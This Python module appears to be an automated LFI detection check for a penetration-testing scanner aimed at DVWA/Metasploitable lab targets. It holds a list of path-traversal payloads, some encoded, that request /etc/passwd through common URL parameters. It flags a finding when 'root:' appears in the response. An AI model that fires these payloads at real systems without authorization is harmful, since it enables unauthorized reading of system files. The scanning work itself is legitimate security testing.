"""File inclusion (LFI) detection check (from skills/penetration-testing/file-inclusion.md).

Strategy: try common path traversal payloads targeting /etc/passwd and look
for a distinctive marker line. Requires the container OS to be Linux
(dvwa/metasploitable); the `/etc/passwd` root line is a deterministic signal.
"""
from __future__ import annotations

import time

from ..scoring import Finding
from . import BaseCheck

CHECK_CLASS = "FileInclusionCheck"

TRAVERSALS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
]
SIGNATURE = "root:"


class FileInclusionCheck(BaseCheck):
    name = "file_inclusion"
    skill_playbook = "skills/penetration-testing/file-inclusion.md"
    mitre = "T1083"
    owasp = "A01:2021"

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.params = ["page", "file", "lang", "path", "template"]

    def run(self) -> list[Finding]:
        findings: list[Finding] = []
        for param in self.params:
            for trav in TRAVERSALS:
                url = f"{self.base_url}/vulnerabilities/fi/?{param}={trav}"
                try:
                    r = self.session.get(url, timeout=self.timeout)
                except Exception:
                    continue
                if r is not None and SIGNATURE in r.text:
                    findings.append(self._finding(
                        "file_inclusion", f"/vulnerabilities/fi/?{param}=",
                        "GET", "file_inclusion",
                        severity="high",
                        detected_at=time.time(),
                        notes="traversal %s returned /etc/passwd signature" % trav,
                    ))
                    return findings
        return findings
